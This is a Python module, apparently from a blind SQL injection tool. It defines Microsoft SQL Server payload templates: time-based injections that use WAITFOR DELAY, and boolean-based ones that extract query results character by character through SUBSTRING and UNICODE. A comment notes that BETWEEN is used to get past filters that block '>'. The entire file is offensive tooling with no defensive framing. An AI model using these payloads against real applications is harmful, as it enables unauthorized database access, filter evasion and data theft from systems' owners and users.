#!/bin/python

from string import Template
from .abstractConfig import AbstractConfig

class MsSqlConfig(AbstractConfig):
    """Contains Mssql specificities"""
    end_char: int = 0
    start_index: int = 1

    def get_equal_compare(self, value: int) -> str:
        return f"={value}"

    def get_diff_compare(self, value: int) -> str:
        return f"!={value}"

    def get_supp_compare(self, value: int, min: int, max: int) -> str:
        """Between because '>' is often blacklisted"""
        return f" BETWEEN {value + 1} AND {max}"

    def wrap_request(self, request: str) -> str:
        return f"ISNULL(({request}),'')"

    payload_int_time: Template = Template(';IF (($request)$test) WAITFOR DELAY \'0:0:$sleep_duration\'')
    payload_str_time: Template = Template(';IF (ISNULL(UNICODE(SUBSTRING(($request),$index,1)),0)$test) WAITFOR DELAY \'0:0:$sleep_duration\'')
    payload_int_bool: Template = Template('($request)$test')
    payload_str_bool: Template = Template('ISNULL(UNICODE(SUBSTRING(($request),$index,1)),0)$test')
